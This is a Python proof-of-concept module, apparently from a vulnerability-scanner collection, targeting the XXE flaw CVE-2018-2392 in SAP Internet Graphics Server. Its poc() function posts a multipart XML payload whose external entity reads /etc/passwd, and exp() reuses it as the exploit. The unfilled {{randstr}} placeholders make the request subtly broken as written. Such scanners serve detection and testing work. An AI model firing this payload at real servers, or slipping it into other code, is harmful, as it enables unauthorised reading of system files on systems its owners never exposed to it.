import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''SAP Internet Graphics Server (IGS) XML External Entity''',
        "description": '''SAP Internet Graphics Servers (IGS) running versions 7.20, 7.20EXT, 7.45, 7.49, or 7.53 has two XXE vulnerabilities within the XMLCHART page - CVE-2018-2392 and CVE-2018-2393. These vulnerabilities occur due to a lack of appropriate validation on the Extension HTML tag when submitting a POST request to the XMLCHART page to generate a new chart.''',
        "severity": "high",
        "references": [
            "https://launchpad.support.sap.com/#/notes/2525222", 
            "https://blogs.sap.com/2018/02/13/sap-security-patch-day-february-2018/", 
            "https://www.rapid7.com/db/modules/auxiliary/admin/sap/sap_igs_xmlchart_xxe/", 
            "https://troopers.de/troopers18/agenda/3r38lr/", 
            "https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/admin/sap/sap_igs_xmlchart_xxe.rb"
        ],
        "classification": {
            "cvss-metrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
            "cvss-score": "",
            "cve-id": "CVE-2018-2392",
            "cwe-id": "CWE-611"
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["cve", "cve2018", "sap", "igs", "xxe", "xmlchart"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = """/XMLCHART"""
        method = "POST"
        data = """--{{randstr_1}}
Content-Disposition: form-data; name="{{randstr_2}}"; filename="{{randstr_3}}.xml"
Content-Type: application/xml

<?xml version='1.0' encoding='UTF-8'?>
    <ChartData>
      <Categories>
        <Category>ALttP</Category>
      </Categories>
      <Series label="{{randstr_4}}">
        <Point>
          <Value type="y">12345</Value>
        </Point>
      </Series>
    </ChartData>
--{{randstr_1}}
Content-Disposition: form-data; name="{{randstr_5}}"; filename="{{randstr_6}}.xml"
Content-Type: application/xml

<?xml version='1.0' encoding='UTF-8'?>
    <!DOCTYPE Extension [<!ENTITY xxe SYSTEM "/etc/passwd">]>
    <SAPChartCustomizing version="1.1">
      <Elements>
        <ChartElements>
          <Title>
            <Extension>&xxe;</Extension>
          </Title>
        </ChartElements>
      </Elements>
    </SAPChartCustomizing>
--{{randstr_1}}--"""
        headers = {'Content-Type': 'multipart/form-data; boundary={{randstr_1}}'}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if ("""Picture""" in resp0.text and """Info""" in resp0.text and """/output/""" in resp0.text) and ("""ImageMap""" in resp0.text or """Errors""" in resp0.text) and (resp0.status_code == 200) and ("""text/html""" in str(resp0.headers) and """SAP Internet Graphics Server""" in str(resp0.headers)):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url